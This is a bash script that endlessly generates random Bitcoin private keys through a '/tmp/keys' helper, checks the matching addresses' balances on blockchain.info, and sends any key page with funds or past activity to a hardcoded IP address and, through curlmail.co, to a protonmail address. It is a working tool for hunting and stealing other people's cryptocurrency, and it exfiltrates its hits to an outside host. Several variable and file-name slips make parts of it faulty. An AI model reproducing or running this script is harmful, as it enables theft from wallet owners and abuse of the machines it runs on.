#!/bin/bash
touch /tmp/asap1
while true
do
rm -rf /tmp/wallet20
rm -rf /tmp/wallet5520
rm -rf /tmp/all_address
rm -rf /tmp/address20aa
rm -rf /tmp/address20ab
rm -rf /tmp/address20
rm -rf /tmp/address55
rm -rf /tmp/address55aa
rm -rf /tmp/address55ab
rm -rf /tmp/address75
rm -rf /tmp/address75aa
rm -rf /tmp/address75ab
rdm=$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))
rdm1=$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))
rdm2=$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))$((1 + RANDOM % 99999))
/tmp/keys btc $rdm > /tmp/wallet20
/tmp/keys btc $rdm1 > /tmp/wallet55
/tmp/keys btc $rdm2 > /tmp/wallet75
cat /tmp/wallet20 | cut -d " " -f 2 > /tmp/address20
cat /tmp/wallet55 | cut -d " " -f 2 > /tmp/address55
cat /tmp/wallet55 | cut -d " " -f 2 > /tmp/address75
split -l 64 /tmp/address20 /tmp/address20
split -l 64 /tmp/address55 /tmp/address55
split -l 64 /tmp/address55 /tmp/address75
address1=$(cat /tmp/address20aa | tr "\n" "|" | sed 's/|$//')
bilance=$(curl -s "https://blockchain.info/balance?cors=true&active=${address1}" | grep -Po '"final_balance":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$bilance" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm
else
mov=$(curl -s "https://blockchain.info/balance?cors=true&active=${address1}" | grep -Po '"total_received":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$mov" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm
else
echo "no"
fi
fi
address2=$(cat /tmp/address20ab | tr "\n" "|" | sed 's/|$//')
bilance2=$(curl -s "https://blockchain.info/balance?cors=true&active=${address2}" | grep -Po '"final_balance":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$bilance2" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm
else
mov2=$(curl -s "https://blockchain.info/balance?cors=true&active=${address2}" | grep -Po '"total_received":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$mov2" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm
else
echo "no"
fi
fi
address3=$(cat /tmp/address55aa | tr "\n" "|" | sed 's/|$//')
bilance3=$(curl -s "https://blockchain.info/balance?cors=true&active=${address3}" | grep -Po '"final_balance":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$bilance3" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm1"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm1
else
mov3=$(curl -s "https://blockchain.info/balance?cors=true&active=${address3}" | grep -Po '"total_received":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$mov3" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm1"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm1
else
echo "no"
fi
fi
address4=$(cat /tmp/address55ab | tr "\n" "|" | sed 's/|$//')
bilance4=$(curl -s "https://blockchain.info/balance?cors=true&active=${address4}" | grep -Po '"final_balance":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$bilance4" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm1"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm1
else
mov4=$(curl -s "https://blockchain.info/balance?cors=true&active=${address4}" | grep -Po '"total_received":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$mov4" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm1"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm1
else
echo "no"
fi
fi
address5=$(cat /tmp/address75aa | tr "\n" "|" | sed 's/|$//')
bilance5=$(curl -s "https://blockchain.info/balance?cors=true&active=${address5}" | grep -Po '"final_balance":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$bilance5" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm2"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm2
else
mov3=$(curl -s "https://blockchain.info/balance?cors=true&active=${address5}" | grep -Po '"total_received":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$mov5" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm2"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm2
else
echo "no"
fi
fi
address6=$(cat /tmp/address75ab | tr "\n" "|" | sed 's/|$//')
bilance6=$(curl -s "https://blockchain.info/balance?cors=true&active=${address6}" | grep -Po '"final_balance":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$bilance6" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm2"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm2
else
mov6=$(curl -s "https://blockchain.info/balance?cors=true&active=${address6}" | grep -Po '"total_received":.*?[^\\],' | cut -d ":" -f 2 | tr -d ",","}" | awk '{if($1>0) print $1}' | tr "\n" ":" | cut -d ":" -f 1)
if [[ "$mov6" -ne 0 ]]
then
curl -s "http://185.164.72.119/wallet.php?wallet=keys.lol/bitcoin/$rdm2"
curl curlmail.co/tig3rh4ck@protonmail.com?content=keys.lol/bitcoin/$rdm2
else
echo "no"
fi
fi
done
